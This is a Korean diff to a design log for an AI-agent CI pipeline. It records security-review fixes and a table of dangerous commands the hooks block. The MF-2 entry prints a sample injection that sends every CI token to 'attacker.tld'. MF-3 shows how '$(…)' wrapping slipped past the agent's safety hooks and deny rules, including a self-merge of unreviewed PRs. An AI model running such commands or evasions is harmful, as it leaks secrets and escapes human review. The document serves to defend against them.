@@ -1314,6 +1314,20 @@ implement부터 이어 간다. 손 라벨 차단(§12.4)은 그대로다 — 이
 그 대가는 이번 라운드에서 #2·#15를 plan부터 다시 돌린 비용이다(#18은 보류).
 
 (이후 항목은 dogfood 진행에 따라 추가)
+#### 최종 리뷰 (Plan 6) — MF-1 · MF-4: 아무 팔도 보지 않는 대기 상태 하나, 세 팔 중 하나만 남은 옛 계약
+
+**리뷰 지적** (`spec/factory-1.0` @ 2ad4e32 전수 리뷰). 둘 다 **고침들 사이의 이음매**다 — 어떤 개별 고침의 회귀가 아니라, 고침이 만든 새 자리를 아무도 보지 않는다는 것.
+
+- **MF-1**: `sweeper.js`의 `STALLED_STAGE`에 `factory:queue`가 없었다. KTB-31이 `factory:rework`에서 고친 것과 **같은** 결함이 라벨 하나에 더 남아 있었던 것이고, 하필 그 라벨이 **`sweepHarnessUnpark`의 목적지**다. 해제 마커의 dedupe는 평생이라, `needs-info → queue` 전이가 만든 `labeled` 이벤트의 다섯 런 중 `factory-triage`가 사라지면(도그푸딩에서 두 번 관측: 데모 #2의 동시성 물결, #15의 Actions 장애 중 좀비 `queued`) 그 피처는 **영원히** 큐에 앉는다 — 해제 팔은 마커를 보고 다시 시도하지 않고, 다른 어떤 팔도 그 라벨을 보지 않았다. KTB-23(하네스 주차)이 하려던 일 전체가 마지막 한 칸에서 끝난다. `needs-human → queue`(`:unstick`)와 blocked 팔의 `blocked → queue` 재시도도 같은 막다른 길이었다.
+  **결정**: `"factory:queue": "triage"`를 `STALLED_STAGE`에 더한다(cron·`--quick` 둘 다). 임계는 다른 라벨과 같다 — 하트비트가 하나도 없으면 `STALL_NO_HEARTBEAT_MIN`(10분). 스펙 §4.3-5의 목록도 같이 고쳤다.
+  **범위 밖(알려진 한계)**: `factory:harness` 이슈는 `factory:queue`로 **생성**되고 전이를 거치지 않으므로 전이 코멘트가 아예 없고, `sweepStalled`는 전이 코멘트 없이는 나이를 판정하지 않는다(추측해서 미는 것보다 낫다는 기존 판결). 그 이슈의 첫 triage 런이 유실되는 경우는 여전히 사람의 `factory status`가 잡는다 — 나이의 대체 출처(이슈 `createdAt`)를 여기서 도입하지 않은 이유는, 그것이 "전이 코멘트가 있어야 판정한다"는 이 팔의 단일 전제를 라벨마다 갈라 놓기 때문이다.
+- **MF-4**: r2 MF1이 락 판정을 `live`/`none|stale`/`unknown` 세 값으로 갈랐는데, **세 팔 중 하트비트 재큐 팔만** r1의 불리언 계약에 남아 있었다: `unknown`을 "락은 그냥 둔다"로만 읽고 **재큐는 그대로 진행**했다. 로컬 `factory run implement <n>`(§4.2.5의 지원되는 진입 경로)은 `runner=local/<host>`라 판정이 **영구히** `unknown`이고, 하트비트 패치 실패는 설계상 삼켜지므로 GitHub 딸꾹질 한 번이면 살아 있는 런이 30분 창을 넘긴다. 그러면 다음 quick sweep(KTB-26 이후 **모든 스테이지 끝**에 돈다 — 잦다)이 `in-progress → planned`로 재큐해 R 예산을 태우고, 살아 있던 builder가 GREEN PR을 밀고 `in-progress → awaiting-review`를 부르면 현재 라벨이 이미 `planned`라 그래프가 거부한다 — **끝난 구현이 좌초하고** 다음 dispatch가 처음부터 다시 돈다. GHA 러너도 `gh run view`가 실패하면(토큰 스코프, Actions 장애) 같은 문에 들어선다: 이 팔이 살아남으라고 있는 바로 그 상황이다.
+  **결정**: 두 dispatch 팔과 **같은 판정**을 한다 — `unknown`이면 재큐하지 않고, 스톨 임계를 넘겼으면 `lock-owner-unknown` 마커 + `factory:needs-human`(`escalateUnknownLock`). 임계 안이면 조용히 넘어간다(`requeue-skipped`) — 정상적으로 시작하는 스테이지를 그 자리에서 사람에게 넘기지 않기 위해서다(blocked 팔의 같은 판정과 짝이다).
+
+**함께 (nit 1)**: `BLOCKED_RETRY.implement.origins`와 `BLOCKED_RETRY_STAGE`의 `factory:planned`는 **도달할 수 없는 항목**이었다 — 그래프에 `planned → blocked` 엣지가 없고, `abortStage`는 라벨이 그 스테이지의 in-flight 라벨(`in-progress`)일 때만 민다. 지웠다. 표는 실제로 생길 수 있는 것만 적어야 표다(`labels.test.js`가 이제 모든 origin에 대해 `canTransition(from, "factory:blocked")`를 요구한다).
+
+**영향**: `factory/lib/sweeper.js`(`STALLED_STAGE`·heartbeat 팔·`BLOCKED_RETRY_STAGE`), `factory/lib/labels.js`, `factory/test/sweeper.test.js`·`labels.test.js`·`run-stage.test.js`, 스펙 §4.3-1·§4.3-5.
+
 ### ⑤ 권한·훅 — KTB-13·14·20·21·23
 
 `--permission-mode dontAsk`의 실제 동작이 스파이크 시점(ADR-002/ADR-008)과 달라져 있었다는 발견(KTB-13, 재리뷰 r1·r2)과, 그로 인해 넓어진 allow가 열어 준 "쓰기 금지 역할이 훅 모르게 워크트리를 건드릴 수 있다"는 잔여 위험을 구조적으로 닫은 결정(KTB-14)을 묶는다.
@@ -1356,17 +1370,33 @@ implement부터 이어 간다. 손 라벨 차단(§12.4)은 그대로다 — 이
 
 **잔여 위험 등록부.** 아래가 지금 실제로 막히는 것과 막히지 않는 것이다 — "훅이 덮는다"를 다시 검증 없이 쓰지 않기 위해 표로 고정한다.
 
+> **읽는 법 (최종 리뷰 MF-3 이후)**: 이 표의 "차단"은 **명령의 어느 자리에 있든** 차단이라는 뜻이다.
+> r1~r2의 두 훅은 동사 앞 경계를 `(^|[;&|[:space:]])`로 잡고 있어서 `out=$(gh pr merge 5 --squash)`·
+> `` `git push …` ``·`{ rm -rf .factory/lib; }`가 **표가 "차단"이라고 적은 자리를 전부 걸어 나갔다**
+> (동사가 눈앞에 그대로 있는데 규칙이 빗나갔다 — 잔여 위험 #4의 *경로* 난독화와는 다른 종류의 구멍이다).
+> 지금 경계는 토큰 경계다: 줄 시작 · 공백 · `(` · 백틱 · `;` · `&` · `|` · `=` · `{`, 그리고 뒤쪽도
+> 같은 집합(`$(docker compose down)`의 `down` 뒤는 `)`다). `hooks.test.js`의 표 기반 테스트가 여덟 가지
+> 회피형(`out=$(…)`·`$(…)`·백틱·`;`·`&&`·`||`·`{ …; }`·파이프)을 위험 동사 19개에 곱해 고정한다.
+>
+> **그리고 L2는 이 표의 근거가 아니다**: Claude Code의 `permissions.deny` `Bash(...)` 매처는 **접두
+> 매칭**이라 `Bash(gh pr merge*)`는 명령이 그 문자열로 **시작할 때만** 맞는다. `out=$(gh pr merge …)`도
+> `x && gh pr merge …`도 그 deny를 스치지 않는다. deny 목록은 실수를 줄이는 안내판이고, 실제 경계는
+> 이 훅들이다 — 그래서 두 훅이 갈라지거나 한 글자 빗나가면 그 자리에는 **아무 방벽도 없다**.
+
 | 모양 | builder (`block-dangerous`) | 쓰기 금지 역할 (`+ deny-all-writes`) |
 |---|---|---|
 | 리다이렉션 `>`/`>>`/`>\|`, `tee` | 보호 경로만 차단 | 차단(/tmp·`$TMPDIR`·`.factory/out/qa/` 제외) |
 | `sed -i`, `perl -i`, `python -c … open(` | 보호 경로만 차단 | 대상 불문 차단 |
 | `node -e\|-p\|--eval\|--print` | 보호 경로를 말하면 차단 | 대상 불문 차단 |
 | `curl -o\|-O\|--output`, `wget` | 보호 경로를 말하면 차단 | 차단(`curl`은 출력 플래그가 있을 때, `wget`은 전면) |
-| `rm`/`mv`/`mkdir`/`touch`/`ln`/`chmod`/`dd`/`install` | 보호 경로만 차단(`dd`는 `of=`) | 차단(카브아웃 제외) |
+| `rm`/`mv`/`ln`/`chmod`/`dd`/`install` | 보호 경로만 차단(`dd`는 `of=`) | 차단(카브아웃 제외) |
+| `mkdir`/`touch` | **차단하지 않는다**(최종 리뷰 SF-3) — 기존 파일의 내용도 동작도 바꾸지 못한다 | 차단(카브아웃 제외) |
 | `cp`/`mv` 목적지, `-t`/`--target-directory` | 보호 경로가 목적지면 차단 | 차단(카브아웃 제외) |
 | `git commit/push/add/checkout/restore/rm/mv/config` | 머지·force-push·lock 삭제·보호 경로 checkout/restore/rm/mv 차단 | 쓰기 서브커맨드 전면 차단 |
 | `git apply` / `git am` | **전면 차단**(패치 내용이 보이지 않는다) | 전면 차단 |
 | `gh pr merge`, `gh api …/merge`, `factory:*` 라벨 조작 | 차단 | 차단 |
+| 락 브랜치 삭제(`git push … --delete factory/lock-N` · `:refs/heads/factory/lock-N` · `:factory/lock-N`) | 차단(세 철자 전부 — 최종 리뷰 MF-3) | 차단(`git push` 전면) |
+| 브랜치 보호·룰셋(`gh api …/branches/*/protection`, `…/rulesets`, `gh ruleset`) | **차단**(메서드 철자 불문: `-X PUT`·`--method PUT`·`-XDELETE` 전부 — 최종 리뷰 SF-2) | 차단 |
 
 **막지 못하는 것(알려진 잔여 위험)**:
 
@@ -1591,6 +1621,31 @@ KTB-23·24·25·26을 소스에 대고 다시 읽은 결과 네 개의 결함과
 테스트: `sweeper.test.js` 6건, `run-stage.test.js` 7건, `claim.test.js` 3건, `harness-request.test.js` 2건,
 `issue-comments.test.js` 1건, `yml-lint.test.js`·`templates.test.js`·`hooks.test.js`·`context.test.js`·
 `workflows.test.js`·`labels.test.js` 각 1건. 스펙 §5.1, 데모 로그 #2·#15 행.
+
+#### 최종 리뷰 (Plan 6) — MF-2 · MF-3: dispatch 입력이 주입 싱크였고, 훅의 앵커가 등록부를 반증했다
+
+**MF-2 — `workflow_dispatch` 입력이 모든 시크릿을 든 스텝의 `run:`에 텍스트로 붙었다.**
+다섯 스테이지 워크플로 전부가 `run: node .factory/bin/run-stage.js <stage> ${{ github.event.issue.number || inputs.issue }}`였다. `${{ … }}`는 셸이 보기 **전에** Actions가 치환하므로 이것은 인자 전달이 아니라 **코드 합성**이다: `inputs.issue`는 자유 문자열(`type: string`)이고, 그 스텝의 `env:`에는 `CLAUDE_CODE_OAUTH_TOKEN`·`ANTHROPIC_API_KEY`·`GH_TOKEN: FACTORY_BOT_TOKEN`이 전부 있다. `gh workflow run`을 부를 수 있는 누구든(레포 write 협력자, 유출된 CI 토큰, 봇 토큰 자신) `1; curl -sd "$(env|base64 -w0)" https://attacker.tld #`을 넣으면 세 토큰이 나간다 — **write 권한이 secret read로 승격된다**. GitHub이 일부러 갈라 둔 경계이고, KTB-8이 `workflow_dispatch`를 재점화의 주 손잡이로 만든 뒤라 이 싱크는 예외 경로가 아니라 **본선** 위에 있었다.
+
+**결정**: 값은 스텝 `env:`의 `ISSUE`로 묶고 스크립트는 `"$ISSUE"`만 읽는다. 그 위에 가드 한 줄 — `[[ "$ISSUE" =~ ^[0-9]+$ ]] || { …; exit 1; }` — 을 `Run stage`와 `Aborted cleanup` **양쪽**에 둔다(조용히 통과시키지 않고 소리내어 죽는다). `${{ github.sha }}`·`${{ job.status }}`·`${{ github.run_id }}`는 그대로다: 공격자가 고를 수 없는 값이라 같은 종류의 위험이 아니고, 규칙을 그쪽까지 넓히면 정당한 자리를 잡아 규칙 자체가 꺼진다. `factory-sweeper.yml`은 입력이 없고 `factory-retro.yml`은 `run:` 밖에서만 `github.event`를 쓴다 — 둘 다 손대지 않았다.
+
+**회귀 방지**: `yml-lint.js`에 `no-expression-in-run` — `run:` 블록(한 줄 형태·블록 스칼라 둘 다, 셸 주석까지 포함) 안의 `${{ inputs.` / `${{ github.event.`를 거부한다. 셸 주석을 벗기지 않는 이유: 치환은 셸보다 **먼저** 일어나므로 주석 안의 표현식도 똑같이 확장된다. 린터는 여덟 템플릿 전부에 돌고(`yml-lint.test.js`), `STAGE_RUN` 표식도 `run-stage.js <stage> "$ISSUE"`로 바뀌어 옛 모양으로 되돌리면 스테이지 규칙 네 개가 침묵하는 것이 곧 신호가 된다.
+
+**MF-3 — 훅의 동사 앞 경계가 `(`도 백틱도 `=`도 몰랐다: 등록부가 "차단"이라고 적은 자리를 명령 치환이 그대로 걸어 나갔다.**
+`block-dangerous.sh`의 열한 개 규칙과 `deny-all-writes.sh`의 `$CMD`가 전부 `(^|[;&|[:space:]])`였다. `out=$(gh pr merge $PR --squash --delete-branch)`는 `gh` 앞 글자가 `(`라 **어떤 규칙에도 걸리지 않는다**(리뷰가 훅을 실제로 실행해 확인했다). 그리고 `.claude/settings.json`의 `Bash(gh pr merge*)` deny는 **접두 매칭**이라 같은 명령을 스치지도 않는다 — 즉 builder가 리뷰되지 않은 자기 PR을 스스로 머지할 수 있었고, 그 머지는 run 기록에도 남지 않는다(KTB-14의 백스톱은 no-write 스테이지의 워크트리 diff만 본다 — `gh` 머지는 둘 다 건드리지 않는다). 같은 구멍이 락 브랜치 삭제·`factory:*` 라벨 조작·docker teardown에도 그대로 났다. **이것은 잔여 위험 #4(경로 난독화)가 아니다**: 동사가 눈앞에 그대로 있는데 규칙이 빗나갔고, 등록부는 그 자리를 "차단"이라고 적고 있었다 — 코드가 등록부를 반증했다.
+
+**결정**:
+- 앞 경계를 **토큰 경계**로 넓힌다: 줄 시작 · 공백 · `(` · 백틱 · `;` · `&` · `|` · `=` · `{`. 뒤 경계도 같은 집합으로(`$(docker compose down)`의 `down` 뒤는 `)`다) — 앞만 고치면 한 앵커를 고치고 다른 앵커에 같은 구멍을 남긴다. 두 훅이 같은 변수(`$A`/`$CMD`, `$Z`/`$ZE`)를 쓴다.
+- 락 브랜치 삭제의 **세 철자**를 다 본다: `--delete … factory/lock-N` · `:refs/heads/factory/lock-N` · `:factory/lock-N`.
+- **브랜치 보호·룰셋** 규칙을 새로 세운다(SF-2): `gh api …/branches/*/protection` · `gh api …/rulesets` · `gh ruleset`, **메서드 철자 불문**. 철자를 하나씩 쫓는 것(`-X PUT` vs `--method PUT` vs `-XPUT`)은 진 싸움이고, 모든 스테이지 env에 `GH_TOKEN=FACTORY_BOT_TOKEN`이 있는 이상 `required_status_checks`/`enforce_admins`를 끄는 것은 L0 자체를 끄는 일이다(그리고 아무 라벨도 코멘트도 나지 않는다). GET까지 막히는 오탐은 손실이 없다 — 보호 설정을 읽어야 하는 역할이 없다.
+- `ln`·`chmod`를 builder의 보호 경로 규칙에 더한다(SF-3): 둘 다 파일을 **쓰지 않고** 그 파일이 하는 일을 바꾼다(`ln -sf /tmp/evil .claude/settings.json`, `chmod -x .factory/bin/gates.js`). `mkdir`·`touch`는 더하지 않고 **등록부 표를 사실에 맞췄다** — 기존 파일의 내용도 동작도 바꾸지 못한다.
+- 등록부 표 위에 읽는 법을 못 박았다: 여기의 "차단"은 **명령의 어느 자리에 있든** 차단이고, **L2 deny는 이 표의 근거가 아니다**(접두 매칭이라 `$( … )`·체인 안에서는 무력하다). 실제 경계는 훅이다.
+
+**테스트**: `hooks.test.js`에 표 기반 두 쌍 — 위험 동사 19개 × 회피형 8가지(`out=$(…)`·`$(…)`·백틱·`;`·`&&`·`||`·`{ …; }`·파이프)를 전부 exit 2로 고정하고, 같은 글자들이 무해한 자리에 있는 정상 명령(`out=$(git status)`·`npm test && git commit`·`chmod +x scripts/run.sh`)은 exit 0으로 고정한다.
+
+**하지 않은 것 — SF-1의 `persist-credentials: false` (알려진 한계)**: 스테이지의 `git push`는 **그 persisted credential로 나간다**. `claim.js`(락 브랜치 claim/release)와 `records-branch.js`(run 기록)는 `git push origin …`을 인자 없이 부르고, 토큰이 들어오는 경로는 `actions/checkout`이 심는 `http.extraheader` 하나뿐이다(`run-stage.js`의 `truncateReason` 주석이 이미 그 배선을 근거로 쓰여 있다 — 명시적 토큰 remote도 `gh auth setup-git`도 없다). 그래서 `persist-credentials: false`를 지금 켜면 **락 claim이 첫 push에서 죽는다** = 모든 스테이지가 멈춘다. 남는 노출은 이것이다: `.git/config`에 base64 토큰 헤더가 있고, 그 트리를 `Bash(*)`를 가진 builder가 읽을 수 있으며, 아티팩트는 `retention-days` 없이(90일 기본) 레포 read 권한자 누구나 받는다. 닫으려면 push 경로를 **명시적 토큰**(`git push https://x-access-token:$FACTORY_BOT_TOKEN@…` 또는 `gh auth setup-git`)으로 옮기고 그 뒤에 `persist-credentials: false` + 업로드 전 `.git/config` 스크럽 + `retention-days: 7`을 한꺼번에 거는 것이 맞다 — 그건 이 라운드의 범위(리뷰가 판정한 네 개의 must-fix)를 넘는 배선 변경이라 다음 라운드로 넘긴다.
+
+**영향**: `templates/factory/github/workflows/factory-{triage,plan,implement,review,merge}.yml`, `factory/lib/yml-lint.js`, `factory/hooks/block-dangerous.sh`, `factory/hooks/deny-all-writes.sh`, `factory/test/yml-lint.test.js`·`hooks.test.js`, 이 문서의 잔여 위험 등록부.
 
 ### ⑥ 관찰 — O1~O12, O14·O15, O20·O23·O24, G1
 
